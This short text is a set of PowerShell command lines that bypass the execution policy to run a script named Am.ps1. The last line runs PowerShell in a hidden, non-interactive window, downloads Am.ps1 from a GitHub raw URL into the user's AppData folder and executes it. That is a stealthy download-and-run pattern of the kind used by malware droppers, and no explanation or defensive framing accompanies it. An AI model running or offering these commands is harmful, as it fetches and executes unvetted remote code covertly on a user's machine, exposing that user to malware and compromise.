Set-ExecutionPolicy Bypass
or
powershell.exe -ExecutionPolicy Bypass -File .\Am.ps1
or
powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://github.com/AnonAm93/1/raw/refs/heads/main/Am.ps1).content > "$env:APPDATA\Am.ps1";powershell "$env:APPDATa\Am.ps1""
